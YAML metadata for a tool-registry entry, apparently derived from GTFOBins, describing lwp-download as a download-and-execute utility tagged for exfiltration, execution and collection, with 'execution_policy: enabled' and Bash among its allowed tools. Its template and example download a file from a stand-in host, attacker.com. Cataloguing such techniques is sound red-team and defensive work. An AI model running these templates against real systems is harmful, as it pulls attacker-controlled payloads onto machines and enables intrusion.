---
id: network-transfer-lwpdownload
namespace: network:transfer:lwpdownload
name: lwp-download
description: Perl web download tool, can download and execute files.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - network.transfer.download
  - security.execution.command
platforms:
  - linux
  - macos
  - bsd
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - lwp-request
  - wget
  - curl
artifacts: []
workflow_edges:
  produces:
    - file-content
    - command-execution
  consumes:
    - file
    - execution-context
contract:
  inputs: []
  outputs:
    - type: process.output
      description: File or command output
  side_effects:
    - network_traffic
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 4
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 4
  network: low
  disk_io: low
allowed-tools:
  - lwp-download
  - lwp-request
  - wget
  - curl
  - Bash
  - execFile
parameters: []
features:
  - file-system
  - process-manip
execution:
  template: "lwp-download https://attacker.com/file /path/to/output"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars: {}
examples:
  - description: Download a file via lwp-download
    command: lwp-download https://attacker.com/file /path/to/output
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/lwp-download/"
techniques:
  - exfiltration
  - execution
  - collection
install:
  - method: apt
    package_name: "libwww-perl"
    commands:
      - "apt-get install -y libwww-perl"
---
